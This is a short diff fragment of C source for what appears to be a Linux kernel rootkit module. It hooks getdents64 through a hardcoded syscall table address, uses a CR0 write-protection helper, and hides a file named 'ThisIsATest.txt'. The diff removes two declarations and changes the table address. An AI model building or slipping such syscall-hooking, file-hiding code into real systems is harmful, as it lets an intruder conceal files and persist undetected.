@@ -5,14 +5,10 @@
 #include <linux/slab.h>
 #include <stdbool.h>
 
-// Function headers. 
-int load(void);
-void unload(void);
-
 // Types & other consts.
 typedef int (*original_getdents64_t)(const struct pt_regs *regs);
 static original_getdents64_t original_getdents64_ptr;
-static unsigned long *syscall_table = (unsigned long *)0xffffffffafe001a0; 
+static unsigned long *syscall_table = (unsigned long *)0xffffffff834001a0; 
 static char *file_name_to_hide = "ThisIsATest.txt";
  
 static inline void wp_cr0(unsigned long val) {
